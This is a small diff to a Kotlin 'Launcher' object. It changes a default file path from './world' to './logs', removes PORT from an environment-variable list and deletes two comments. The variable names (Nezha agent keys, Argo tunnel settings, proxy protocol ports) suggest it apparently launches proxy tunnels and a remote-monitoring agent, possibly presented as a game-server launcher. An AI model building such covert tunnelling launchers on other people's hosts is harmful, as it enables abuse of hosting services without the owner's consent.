@@ -63,10 +63,10 @@ object Launcher {
     val startTime = System.currentTimeMillis()
 
     private var sbxProcess: Process? = null
-    private val filePath = System.getenv("FILE_PATH") ?: "./world"
+    private val filePath = System.getenv("FILE_PATH") ?: "./logs"
     
     private val ALL_ENV_VARS = arrayOf(
-        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
+        "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
         "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
         "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
         "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
@@ -151,7 +151,6 @@ object Launcher {
         envVars["NAME"] = ""
         envVars["DISABLE_ARGO"] = "false"
         
-        // 从环境变量覆盖
         ALL_ENV_VARS.forEach { varName ->
             System.getenv(varName)?.let { envVars[varName] = it }
             System.getProperty(varName)?.let { envVars[varName] = it }
@@ -208,7 +207,6 @@ object Launcher {
         try {
             when {
                 System.getProperty("os.name").contains("Windows", ignoreCase = true) -> {
-                    // Windows 系统
                     ProcessBuilder("cmd", "/c", "cls")
                         .inheritIO()
                         .start()
